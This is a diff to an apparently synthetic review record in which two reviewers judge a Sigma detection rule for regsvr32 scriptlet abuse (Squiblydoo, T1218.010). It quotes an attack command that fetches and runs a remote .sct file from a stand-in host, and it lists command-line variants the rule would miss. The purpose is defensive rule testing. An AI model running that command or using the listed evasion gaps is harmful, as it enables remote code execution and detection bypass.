@@ -123,6 +123,44 @@ events:
     dest_port: null
     name: null
 tamper_sigma_yaml: ''
-review: {}
+review:
+  verdicts:
+  - reviewer: R2
+    role: primary
+    verdict: present
+    confidence: 90
+    reasoning: 'YAML and pySigma parse cleanly and all metadata is present. T1218.010 gets attack.stealth
+      and attack.t1218.010, as in the table. The values regsvr32.exe, scrobj.dll and /i:http occur in
+      the verbatim quote ''regsvr32.exe /s /n /u /i:http://files.cranemail.test/update.sct scrobj.dll'',
+      which I confirmed in report_text. ''all of selection*'' is allowed and all three selections start
+      with ''selection''. By hand: all three positives match (http, https via the /i:http prefix, and
+      an IP URL). The negatives (msiexec, cmd, OUTLOOK) do not. Look-alike 1 (regsvr32 /s of viewer.dll)
+      and look-alike 2 (regsvr32 /s /u shell.dll) lack scrobj.dll and /i:http, so they do not match. The
+      baseline has no regsvr32.'
+    events_ok: true
+    incidental_issues:
+    - Positive 2 uses an https URL, whereas the report says an http URL in every observed case. The rule
+      still covers it through the prefix.
+    - The dash form '-i:http' and a quoted /i:"http" form are not covered, which is acceptable given the
+      report.
+    - Look-alike 2 has an unquoted path with spaces, which is cosmetic.
+  - reviewer: R4
+    role: replacement
+    verdict: present
+    confidence: 88
+    reasoning: The YAML parses and pySigma accepts it with complete metadata. 'all of selection*' is allowed,
+      the fields are only Image and CommandLine, and the tags attack.stealth and attack.t1218.010 are
+      correct. Both quotations appear word for word in report_text. 'regsvr32.exe', 'scrobj.dll' and '/i:http'
+      (also 'i:http' with separators stripped) occur in quote 1 and quote 2. By hand, all three positives
+      have an image ending in \regsvr32.exe, scrobj.dll and /i:http; positive 2's /i:https contains /i:http.
+      The negatives (msiexec, cmd ipconfig, OUTLOOK) and both regsvr32 look-alikes (viewer.dll, shell.dll
+      with no scrobj or /i:http) do not match. The breadth guard is met by the 10-character 'scrobj.dll'.
+    events_ok: true
+    incidental_issues:
+    - Look-alike 2 'regsvr32.exe /s /u C:\Program Files\OldApp\shell.dll' has an unquoted path containing
+      a space, which is a little unrealistic.
+    - 'Coverage gap that does not violate the case: Squiblydoo variants with the dash form (-i:http),
+      a quoted URL (/i:"http...), a full path to scrobj.dll without the literal ''scrobj.dll'' after a
+      renamed copy, or a non-http scheme would be missed.'
 excluded: false
 exclusion_reason: ''
